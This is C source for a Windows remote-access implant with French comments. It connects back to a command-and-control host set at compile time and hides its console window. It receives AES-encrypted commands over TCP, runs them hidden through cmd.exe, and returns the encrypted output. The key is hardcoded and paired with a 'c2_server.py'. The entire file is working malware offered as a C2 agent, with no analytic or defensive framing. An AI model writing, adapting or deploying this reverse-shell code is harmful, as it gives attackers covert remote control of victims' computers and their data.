#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>

/* ================================================== */
/* C2 IP et PORT définis à la compilation             */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
#define CLIENT_IP (char *)"0.0.0.0"
#define CLIENT_PORT (int)0
#endif

/* ================================================== */
/* Clé AES-256 partagée (32 bytes)                   */
/* DOIT être identique dans c2_server.py             */
/* ================================================== */
static const uint8_t AES_KEY[32] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15,
    0x88, 0x09, 0xcf, 0x4f, 0x3c, 0x76, 0x2e, 0x71, 0x60, 0xf3, 0x8b,
    0x4d, 0xa5, 0x6a, 0x78, 0x4d, 0x90, 0x45, 0x19, 0x0c, 0xfe};

/* ================================================== */
/* AES-256-CBC (tiny-AES-c)                          */
/* ================================================== */
#define AES_BLOCKLEN 16
#define AES_KEYLEN 32
#define AES_keyExpSize 240
#define Nb 4
#define Nk 8
#define Nr 14

typedef uint8_t state_t[4][4];
typedef struct {
  uint8_t RoundKey[AES_keyExpSize];
  uint8_t Iv[AES_BLOCKLEN];
} AES_ctx;

static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b,
    0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26,
    0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2,
    0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed,
    0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f,
    0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec,
    0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14,
    0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d,
    0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f,
    0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11,
    0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f,
    0xb0, 0x54, 0xbb, 0x16};
static const uint8_t rsbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e,
    0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
    0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32,
    0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49,
    0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
    0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50,
    0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05,
    0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41,
    0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8,
    0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
    0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b,
    0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59,
    0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
    0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d,
    0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63,
    0x55, 0x21, 0x0c, 0x7d};
static const uint8_t Rcon[11] = {0x8d, 0x01, 0x02, 0x04, 0x08, 0x10,
                                 0x20, 0x40, 0x80, 0x1b, 0x36};

static void KeyExpansion(uint8_t *RoundKey, const uint8_t *Key) {
  unsigned i, j, k;
  uint8_t t[4];
  for (i = 0; i < Nk; i++) {
    RoundKey[i * 4] = Key[i * 4];
    RoundKey[i * 4 + 1] = Key[i * 4 + 1];
    RoundKey[i * 4 + 2] = Key[i * 4 + 2];
    RoundKey[i * 4 + 3] = Key[i * 4 + 3];
  }
  for (i = Nk; i < Nb * (Nr + 1); i++) {
    k = (i - 1) * 4;
    t[0] = RoundKey[k];
    t[1] = RoundKey[k + 1];
    t[2] = RoundKey[k + 2];
    t[3] = RoundKey[k + 3];
    if (i % Nk == 0) {
      uint8_t u = t[0];
      t[0] = sbox[t[1]] ^ Rcon[i / Nk];
      t[1] = sbox[t[2]];
      t[2] = sbox[t[3]];
      t[3] = sbox[u];
    } else if (i % Nk == 4) {
      t[0] = sbox[t[0]];
      t[1] = sbox[t[1]];
      t[2] = sbox[t[2]];
      t[3] = sbox[t[3]];
    }
    j = i * 4;
    k = (i - Nk) * 4;
    RoundKey[j] = RoundKey[k] ^ t[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ t[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ t[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ t[3];
  }
}
static void AES_init_ctx_iv(AES_ctx *ctx, const uint8_t *key,
                            const uint8_t *iv) {
  KeyExpansion(ctx->RoundKey, key);
  memcpy(ctx->Iv, iv, AES_BLOCKLEN);
}
static uint8_t xtime(uint8_t x) { return ((x << 1) ^ (((x >> 7) & 1) * 0x1b)); }
static void AddRoundKey(uint8_t r, state_t *s, const uint8_t *K) {
  for (int i = 0; i < 4; i++)
    for (int j = 0; j < 4; j++)
      (*s)[i][j] ^= K[r * Nb * 4 + i * Nb + j];
}
static void SubBytes(state_t *s) {
  for (int i = 0; i < 4; i++)
    for (int j = 0; j < 4; j++)
      (*s)[j][i] = sbox[(*s)[j][i]];
}
static void ShiftRows(state_t *s) {
  uint8_t t;
  t = (*s)[0][1];
  (*s)[0][1] = (*s)[1][1];
  (*s)[1][1] = (*s)[2][1];
  (*s)[2][1] = (*s)[3][1];
  (*s)[3][1] = t;
  t = (*s)[0][2];
  (*s)[0][2] = (*s)[2][2];
  (*s)[2][2] = t;
  t = (*s)[1][2];
  (*s)[1][2] = (*s)[3][2];
  (*s)[3][2] = t;
  t = (*s)[0][3];
  (*s)[0][3] = (*s)[3][3];
  (*s)[3][3] = (*s)[2][3];
  (*s)[2][3] = (*s)[1][3];
  (*s)[1][3] = t;
}
static void MixColumns(state_t *s) {
  uint8_t i, T, Tm, t;
  for (i = 0; i < 4; i++) {
    t = (*s)[i][0];
    T = (*s)[i][0] ^ (*s)[i][1] ^ (*s)[i][2] ^ (*s)[i][3];
    Tm = (*s)[i][0] ^ (*s)[i][1];
    Tm = xtime(Tm);
    (*s)[i][0] ^= Tm ^ T;
    Tm = (*s)[i][1] ^ (*s)[i][2];
    Tm = xtime(Tm);
    (*s)[i][1] ^= Tm ^ T;
    Tm = (*s)[i][2] ^ (*s)[i][3];
    Tm = xtime(Tm);
    (*s)[i][2] ^= Tm ^ T;
    Tm = (*s)[i][3] ^ t;
    Tm = xtime(Tm);
    (*s)[i][3] ^= Tm ^ T;
  }
}
static void Cipher(state_t *s, const uint8_t *K) {
  AddRoundKey(0, s, K);
  for (int r = 1; r < Nr; r++) {
    SubBytes(s);
    ShiftRows(s);
    MixColumns(s);
    AddRoundKey(r, s, K);
  }
  SubBytes(s);
  ShiftRows(s);
  AddRoundKey(Nr, s, K);
}
static void InvSubBytes(state_t *s) {
  for (int i = 0; i < 4; i++)
    for (int j = 0; j < 4; j++)
      (*s)[j][i] = rsbox[(*s)[j][i]];
}
static void InvShiftRows(state_t *s) {
  uint8_t t;
  t = (*s)[3][1];
  (*s)[3][1] = (*s)[2][1];
  (*s)[2][1] = (*s)[1][1];
  (*s)[1][1] = (*s)[0][1];
  (*s)[0][1] = t;
  t = (*s)[0][2];
  (*s)[0][2] = (*s)[2][2];
  (*s)[2][2] = t;
  t = (*s)[1][2];
  (*s)[1][2] = (*s)[3][2];
  (*s)[3][2] = t;
  t = (*s)[0][3];
  (*s)[0][3] = (*s)[1][3];
  (*s)[1][3] = (*s)[2][3];
  (*s)[2][3] = (*s)[3][3];
  (*s)[3][3] = t;
}
static void InvMixColumns(state_t *s) {
  uint8_t a, b, c, d;
  uint8_t M(uint8_t x, uint8_t y) {
    return (((y & 1) * x) ^ ((y >> 1 & 1) * xtime(x)) ^
            ((y >> 2 & 1) * xtime(xtime(x))) ^
            ((y >> 3 & 1) * xtime(xtime(xtime(x)))) ^
            ((y >> 4 & 1) * xtime(xtime(xtime(xtime(x))))));
  }
  for (int i = 0; i < 4; i++) {
    a = (*s)[i][0];
    b = (*s)[i][1];
    c = (*s)[i][2];
    d = (*s)[i][3];
    (*s)[i][0] = M(a, 0x0e) ^ M(b, 0x0b) ^ M(c, 0x0d) ^ M(d, 0x09);
    (*s)[i][1] = M(a, 0x09) ^ M(b, 0x0e) ^ M(c, 0x0b) ^ M(d, 0x0d);
    (*s)[i][2] = M(a, 0x0d) ^ M(b, 0x09) ^ M(c, 0x0e) ^ M(d, 0x0b);
    (*s)[i][3] = M(a, 0x0b) ^ M(b, 0x0d) ^ M(c, 0x09) ^ M(d, 0x0e);
  }
}
static void InvCipher(state_t *s, const uint8_t *K) {
  AddRoundKey(Nr, s, K);
  for (int r = Nr - 1; r > 0; r--) {
    InvShiftRows(s);
    InvSubBytes(s);
    AddRoundKey(r, s, K);
    InvMixColumns(s);
  }
  InvShiftRows(s);
  InvSubBytes(s);
  AddRoundKey(0, s, K);
}
static void XorIv(uint8_t *b, const uint8_t *v) {
  for (int i = 0; i < AES_BLOCKLEN; i++)
    b[i] ^= v[i];
}
static void AES_CBC_encrypt(AES_ctx *ctx, uint8_t *buf, size_t len) {
  uint8_t *Iv = ctx->Iv;
  for (size_t i = 0; i < len; i += AES_BLOCKLEN) {
    XorIv(buf, Iv);
    Cipher((state_t *)buf, ctx->RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
  }
  memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}
static void AES_CBC_decrypt(AES_ctx *ctx, uint8_t *buf, size_t len) {
  uint8_t nxt[AES_BLOCKLEN];
  for (size_t i = 0; i < len; i += AES_BLOCKLEN) {
    memcpy(nxt, buf, AES_BLOCKLEN);
    InvCipher((state_t *)buf, ctx->RoundKey);
    XorIv(buf, ctx->Iv);
    memcpy(ctx->Iv, nxt, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }
}

/* ================================================== */
/* Réseau                                             */
/* ================================================== */
static int recv_all(SOCKET s, uint8_t *buf, int n) {
  int t = 0, r;
  while (t < n) {
    r = recv(s, (char *)(buf + t), n - t, 0);
    if (r <= 0)
      return -1;
    t += r;
  }
  return t;
}

/* Envoyer [4B len][16B IV][cipher] */
static int send_enc(SOCKET s, const uint8_t *data, int dlen) {
  int pad = AES_BLOCKLEN - (dlen % AES_BLOCKLEN);
  int plen = dlen + pad;
  uint8_t *buf = (uint8_t *)malloc(plen);
  if (!buf)
    return -1;
  memcpy(buf, data, dlen);
  memset(buf + dlen, pad, pad);
  /* IV = first 16 bytes of AES_KEY XOR tick (simple, deterministic) */
  uint8_t iv[AES_BLOCKLEN];
  DWORD t = GetTickCount();
  for (int i = 0; i < AES_BLOCKLEN; i++)
    iv[i] = AES_KEY[i] ^ ((uint8_t)(t >> (i % 4 * 8)));
  AES_ctx ctx;
  AES_init_ctx_iv(&ctx, AES_KEY, iv);
  AES_CBC_encrypt(&ctx, buf, plen);
  int tlen = AES_BLOCKLEN + plen;
  uint8_t hdr[4] = {(tlen >> 24) & 0xFF, (tlen >> 16) & 0xFF,
                    (tlen >> 8) & 0xFF, tlen & 0xFF};
  send(s, (char *)hdr, 4, 0);
  send(s, (char *)iv, AES_BLOCKLEN, 0);
  send(s, (char *)buf, plen, 0);
  free(buf);
  return 0;
}

/* Recevoir [4B len][16B IV][cipher] → déchiffré */
static uint8_t *recv_dec(SOCKET s, int *olen) {
  uint8_t hdr[4];
  if (recv_all(s, hdr, 4) < 0)
    return NULL;
  int tlen = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
  if (tlen <= 16 || tlen > 65536)
    return NULL;
  uint8_t *pay = (uint8_t *)malloc(tlen);
  if (!pay)
    return NULL;
  if (recv_all(s, pay, tlen) < 0) {
    free(pay);
    return NULL;
  }
  uint8_t *iv = pay;
  uint8_t *ct = pay + AES_BLOCKLEN;
  int clen = tlen - AES_BLOCKLEN;
  AES_ctx ctx;
  AES_init_ctx_iv(&ctx, AES_KEY, iv);
  AES_CBC_decrypt(&ctx, ct, clen);
  int pad = ct[clen - 1];
  if (pad <= 0 || pad > AES_BLOCKLEN)
    pad = 0;
  *olen = clen - pad;
  uint8_t *res = (uint8_t *)malloc(*olen + 1);
  memcpy(res, ct, *olen);
  res[*olen] = 0;
  free(pay);
  return res;
}

/* ================================================== */
/* Exécuter une commande et capturer l'output         */
/* ================================================== */
static char *exec_cmd(const char *cmd) {
  char *out = (char *)malloc(65536);
  if (!out)
    return NULL;
  out[0] = 0;
  /* Créer fichier temp */
  char tmp[MAX_PATH];
  GetTempPathA(MAX_PATH, tmp);
  strcat(tmp, "s0p_out.txt");
  /* Commande avec redirection vers fichier */
  char full[8192];
  snprintf(full, sizeof(full), "cmd /C \"%s\" > \"%s\" 2>&1", cmd, tmp);
  /* Exécuter en caché */
  STARTUPINFOA si = {0};
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi = {0};
  CreateProcessA(NULL, full, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL,
                 &si, &pi);
  WaitForSingleObject(pi.hProcess, 5000);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  /* Lire le fichier */
  FILE *f = fopen(tmp, "rb");
  if (f) {
    size_t n = fread(out, 1, 65535, f);
    out[n] = 0;
    fclose(f);
    DeleteFileA(tmp);
  }
  if (strlen(out) == 0)
    strcpy(out, "[no output]\r\n");
  return out;
}

/* ================================================== */
/* Main                                               */
/* ================================================== */
int main(void) {
  if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0)
    return 1;
  /* Cacher la console si elle existe */
  HWND hw = GetConsoleWindow();
  if (hw)
    ShowWindow(hw, SW_HIDE);
  WSADATA w;
  if (WSAStartup(MAKEWORD(2, 2), &w) != 0)
    return 1;
  struct sockaddr_in sa;
  SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons(CLIENT_PORT);
  sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
#ifdef WAIT_FOR_CLIENT
  while (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0)
    Sleep(5000);
#else
  if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0)
    return 1;
#endif
  /* Boucle principale */
  while (1) {
    int clen = 0;
    uint8_t *cmd = recv_dec(s, &clen);
    if (!cmd)
      break;
    /* Nettoyer la commande (retirer \r\n) */
    char cmdstr[4096] = {0};
    int l = (clen < 4095) ? clen : 4095;
    memcpy(cmdstr, cmd, l);
    free(cmd);
    while (l > 0 && (cmdstr[l - 1] == '\r' || cmdstr[l - 1] == '\n'))
      cmdstr[--l] = 0;
    if (l == 0) {
      send_enc(s, (uint8_t *)"\r\n", 2);
      continue;
    }
    /* Exécuter */
    char *out = exec_cmd(cmdstr);
    if (out) {
      send_enc(s, (uint8_t *)out, strlen(out));
      free(out);
    } else
      send_enc(s, (uint8_t *)"[error]\r\n", 9);
  }
  closesocket(s);
  WSACleanup();
  return 0;
}
